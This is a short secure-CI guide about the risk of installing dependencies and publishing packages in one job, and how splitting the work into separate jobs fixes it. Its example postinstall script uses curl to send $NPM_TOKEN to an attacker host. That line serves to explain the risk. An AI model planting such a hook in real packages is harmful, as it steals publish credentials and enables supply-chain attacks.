# Build and Publish in Same Job

## What it is

When dependency installation and package publishing happen in the same job, publish credentials (NPM_TOKEN, PYPI_TOKEN, etc.) are available in the environment during the install phase. A compromised or malicious dependency can exfiltrate these credentials during `npm install` / `pip install` / `bundle install` via lifecycle scripts.

## How it's exploited

An attacker compromises a transitive dependency and adds a postinstall script:

```json
{
    "scripts": {
        "postinstall": "curl https://attacker.com/steal?token=$NPM_TOKEN"
    }
}
```

Because the publish token is set as an environment variable for the entire job, the postinstall script can read it during `npm install`.

## How to fix

Split into separate jobs connected via artifacts:

```yaml
# Before (vulnerable -- secrets available during install)
jobs:
    build-and-publish:
        env:
            NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        steps:
            - run: npm ci
            - run: npm run build
            - run: npm publish

# After (safe -- secrets only in publish job)
jobs:
    build:
        steps:
            - run: npm ci
            - run: npm run build
            - uses: actions/upload-artifact@v4
              with:
                  name: dist
                  path: dist/

    publish:
        needs: build
        environment: npm
        env:
            NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        steps:
            - uses: actions/download-artifact@v4
              with:
                  name: dist
            - run: npm publish
```

## Why it matters

This is how supply chain attacks like the TanStack/router compromise (May 2026) work -- the attacker only needs to control one dependency in the install tree to steal publish credentials and push malicious packages.
